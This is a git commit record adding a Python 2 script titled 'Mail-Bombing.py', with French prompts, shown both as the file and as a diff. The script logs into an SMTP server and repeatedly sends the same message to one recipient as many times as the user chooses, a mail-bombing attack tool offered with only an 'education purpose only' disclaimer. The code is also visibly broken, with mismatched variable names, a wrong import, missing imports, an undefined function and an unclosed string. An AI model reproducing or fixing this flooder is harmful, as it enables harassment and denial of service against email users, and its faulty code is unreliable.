704846c555c5d7c50be9870958680c20845223c6
Anik Reza Akash <71102931+anikrezaakash@users.noreply.github.com>
2020-09-11 21:15:13 +0600

    Mail -Bombing.py
    #!/usr/bin/python
    #Copyright : nik something missing word   
    #This code for education purpose only.
    #Use it at your own risk !!!
    #Code your freedom
    
    import smtplib
    import mimetypes
    from email.MIMETEXT import MIMETEXT
    
    class SMTP(object):
        
        def title(self):
            print("TITRE : PYTHON MAIL BOMBER by Nik_hm")
        
        def SMTPconnect(self):
            print ("Nous sommes dans SMTPconnect") #list of SMTP server - http://www.e-eeasy.com/SMTPServerList.aspx
            self.smtpserver = raw_input("\nEntrez le nom du serveur SMTP : ")
            self.smtpport = input("Entrez le numéro du port (souvent c'est 25 ou 465): ")
    
            try:
                self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
            except IOError, e:
                print('ERREUR : %s%' %(e))
                time.sleep(5)
                sys.exit(1)
            self.mailServer.starttls()
            self.username = raw_input("\nEntrez le nom d'utilisateur : ")
            self.password = raw_input("\nEntrez le mot de passe : ")
            try:
                self.mailServer.login(self.username, self.password)
            except BaseException, e:
                print("ERREUR : %s" %(e))
                time.sleep(3)
                sys.exit(1)
        
        def buildemail(self):
            print(buildmail())
            self.From = raw_input("\nDe : ")
            self.To = raw_input("\nA : ")
            self.Subject = raw_input("\nSujet : ")
            self.Message = raw_input("\nVotre message : ")
    
            mensje = MIMETEXT(self.Message)
            mensaje['From'] = self.From
            mensaje['To'] = self.To
            mensaje['Subject'] = self.Subject
            self.ammount = input("Numéro Spam : ")
            x = 0
            while x < self.ammount:
                self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
                x+=1
            print("Envoyé ")
            time.sleep(10)
            print("Le message a été envoyé :) ")
            print("I am nik Buddy)
    
    if __name__ == "__main" :
        s = SMTP()
        s.title()
        s.SMTPconnect()
        s.buildemail()

---
+++ Mail-Bombing.py
@@ -0,0 +1,65 @@
+#!/usr/bin/python
+#Copyright : nik something missing word   
+#This code for education purpose only.
+#Use it at your own risk !!!
+#Code your freedom
+
+import smtplib
+import mimetypes
+from email.MIMETEXT import MIMETEXT
+
+class SMTP(object):
+    
+    def title(self):
+        print("TITRE : PYTHON MAIL BOMBER by Nik_hm")
+    
+    def SMTPconnect(self):
+        print ("Nous sommes dans SMTPconnect") #list of SMTP server - http://www.e-eeasy.com/SMTPServerList.aspx
+        self.smtpserver = raw_input("\nEntrez le nom du serveur SMTP : ")
+        self.smtpport = input("Entrez le numéro du port (souvent c'est 25 ou 465): ")
+
+        try:
+            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
+        except IOError, e:
+            print('ERREUR : %s%' %(e))
+            time.sleep(5)
+            sys.exit(1)
+        self.mailServer.starttls()
+        self.username = raw_input("\nEntrez le nom d'utilisateur : ")
+        self.password = raw_input("\nEntrez le mot de passe : ")
+        try:
+            self.mailServer.login(self.username, self.password)
+        except BaseException, e:
+            print("ERREUR : %s" %(e))
+            time.sleep(3)
+            sys.exit(1)
+    
+    def buildemail(self):
+        print(buildmail())
+        self.From = raw_input("\nDe : ")
+        self.To = raw_input("\nA : ")
+        self.Subject = raw_input("\nSujet : ")
+        self.Message = raw_input("\nVotre message : ")
+
+        mensje = MIMETEXT(self.Message)
+        mensaje['From'] = self.From
+        mensaje['To'] = self.To
+        mensaje['Subject'] = self.Subject
+        self.ammount = input("Numéro Spam : ")
+        x = 0
+        while x < self.ammount:
+            self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
+            x+=1
+        print("Envoyé ")
+        time.sleep(10)
+        print("Le message a été envoyé :) ")
+        print("I am nik Buddy)
+
+if __name__ == "__main" :
+    s = SMTP()
+    s.title()
+    s.SMTPconnect()
+    s.buildemail()
+
+    
+    
